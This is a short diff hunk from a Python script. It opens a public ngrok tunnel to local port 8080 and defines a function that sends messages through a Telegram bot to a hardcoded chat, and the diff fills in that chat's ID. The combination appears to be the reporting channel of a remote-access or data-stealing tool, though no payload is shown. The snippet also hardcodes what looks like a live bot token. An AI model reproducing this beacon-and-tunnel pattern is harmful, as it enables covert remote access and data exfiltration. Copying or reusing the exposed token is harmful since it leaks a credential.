@@ -12,7 +12,7 @@ from  getpass import  getuser
 public_url = ngrok.connect(8080)
 __author__ = "George"
 bottoken = "6198001528:AAFOl37fPOGb83G8dMlrFI7UpXUFzUXMXpg"
-chatid = ""
+chatid = "860409611"
 def sendtg(msg, bot, chatid):
     url = "https://api.telegram.org/bot" + bot + "/sendMessage?chat_id=" + chatid + "&text=" + msg
     requests.get(url)
